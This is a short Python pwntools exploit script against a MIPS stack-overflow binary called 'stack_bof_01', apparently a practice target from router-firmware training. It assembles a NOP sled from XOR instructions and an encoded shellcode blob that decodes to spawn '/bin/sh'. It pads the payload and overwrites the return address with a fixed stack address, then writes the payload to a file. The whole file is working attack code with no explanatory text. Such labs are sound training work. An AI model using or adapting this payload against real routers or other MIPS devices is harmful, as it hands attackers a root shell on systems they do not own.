from pwn import *
context(log_level='debug',arch='mips',endian='little',bits=32)

# libc_addr=0x3fecd000

payload=b""

# NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
for i in range(30):
    payload += b"\x26\x40\x08\x01"

buf =  b""
buf += b"\xc6\xff\x0e\x24\x27\x70\xc0\x01\xac\xff\x0b\x24"
buf += b"\xff\xff\x10\x05\xde\x86\x08\x28\x27\x58\x60\x01"
buf += b"\x21\xc8\xeb\x03\x21\x80\xeb\x03\xee\xa5\x17\x28"
buf += b"\xff\xff\x31\x83\xfc\xff\x0d\x24\x27\x30\xa0\x01"
buf += b"\xfe\xff\xcf\x20\xfc\xff\x28\x83\x21\xb8\xef\x02"
buf += b"\x12\x89\x03\x39\x2b\xf0\xee\x02\xfc\xff\x23\xa3"
buf += b"\xfa\xff\xc0\x17\x21\xc8\x2f\x03\xfc\xff\x04\x26"
buf += b"\xcb\xff\x0a\x24\x27\x28\x40\x01\x33\x10\x02\x24"
buf += b"\x0c\x54\x4a\x01\x12\x12\x12\x12\x74\x14\x14\x36"
buf += b"\xed\xed\xc2\x16\xed\xed\x14\x3a\xf2\xed\xaf\x35"
buf += b"\x13\x02\xf6\x35\x0d\xe2\x96\x36\xfa\xed\xb6\xbd"
buf += b"\xfe\xed\xb2\xbd\xfa\xed\xb7\x35\xb9\x1d\x10\x36"
buf += b"\x1e\x13\x13\x13\x3d\x70\x7b\x7c\x3d\x61\x7a\x12"


payload +=buf
stack_addr=0x407ffc08
payload+=b"a"*(508-len(payload))+p32(stack_addr)

with open("payload","w") as f:
	f.write(payload)
# io=process(b"./q  -L ./ -g 1234 ./stack_bof_01 ".decode()+payload,shell=True)

# io.interactive()